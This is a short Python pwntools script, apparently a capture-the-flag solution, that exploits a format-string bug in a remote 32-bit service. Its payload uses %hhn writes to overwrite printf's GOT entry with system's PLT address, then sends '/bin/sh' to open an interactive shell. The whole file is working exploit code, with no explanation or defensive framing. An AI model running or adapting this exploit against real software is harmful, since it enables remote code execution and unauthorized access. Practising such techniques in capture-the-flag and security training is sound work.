from pwn import *
import pwn


def main():
    r = pwn.remote('ctf.hackme.quest', 7711)
    printf_got = 0x0804a010
    system_plt = 0x08048400

    p = p32(printf_got) + p32(printf_got + 1) + p32(printf_got + 2) + p32(printf_got + 3)
    #  00 84 04 08    system's plt
    p += b'%240c%7$hhn'  # write 0x00
    p += b'%132c%8$hhn'  # write 0x84
    p += b'%128c%9$hhn'  # write 0x04
    p += b'%4c%10$hhn'   # write 0x08
    r.sendline(p)
    r.sendline('/bin/sh\00')

    r.interactive()


if __name__ == '__main__':
    main()
